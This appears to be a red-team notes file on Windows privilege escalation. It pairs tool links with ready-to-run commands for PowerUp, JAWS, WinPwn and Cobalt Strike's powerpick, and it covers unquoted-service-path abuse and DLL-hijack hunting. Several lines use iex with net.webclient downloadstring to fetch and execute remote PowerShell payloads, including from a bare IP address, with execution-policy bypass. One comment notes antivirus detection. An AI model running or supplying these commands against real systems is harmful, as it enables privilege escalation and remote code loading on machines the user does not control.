
#Cheatsheets
#https://github.com/emilyanncr/Windows-Post-Exploitation
#https://github.com/frizb/Windows-Privilege-Escalation


#Techniques
##Unquoted service path
#https://medium.com/@bakerc/using-powerup-to-find-and-exploit-unquoted-service-paths-in-windows-cb0056769840
#tries to Write NCRAggregateService to c:\
powerpick Write-ServiceBinary -Name 'NCRAggregateService' -Path C:\
#gets flagged by AV most of the time I guess though

##Check permissions
accesschk64.exe -accepteula c:\Users\myuser\

##DLL hijacking
#Dans procmon:
#1- The result is “NAME NOT FOUND”
#2- The path ends in “dll” or “sys”
#3- The user is SYSTEM
#or
#Integrity is High or System


#TOOLS
##https://github.com/411Hall/JAWS
.\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
#in cobaltstrike:
powerpick .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
#note: be patient, outputfile will be created only at the end of the script

#https://github.com/rasta-mouse/Watson

#PowerUP
Import-Module /usr/share/tools/PowerSploit/Privesc/PowerUp.ps1
Invoke-AllChecks -HtmlReport

#https://github.com/carlospolop/PEASS-ng

#https://github.com/S3cur3Th1sSh1t/WinPwn
##LOAD
#If Internet
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Obfus_SecurePS_WinPwn.ps1')
#OR
iex(new-object net.webclient).downloadstring('http://180.176.33.51:8080/Winpwn.ps1')
#If no internet:
iex(new-object net.webclient).downloadstring('http://180.176.33.51:8080/Offline_WinPwn.ps1')

##RUN
WinPwn
#From cobaltstrike
powershell WinPwn -noninteractive -consoleoutput -Localrecon
shell C:\Users\user\powershell2.exe -exec bypass -nop "iex(new-object net.webclient).downloadstring('http://180.176.33.51:8080/Offline_WinPwn.ps1'); whoami; WinPwn -noninteractive -consoleoutput -Localrecon"

mkdir winpwn
cd winpwn
WinPwn -PowerSharpPack -noninteractive


#Windows Kernel exploits
https://github.com/SecWiki/windows-kernel-exploits

#Concealed Position
## Bring your Own Vulnerability
##https://github.com/jacob-baines/concealed_position
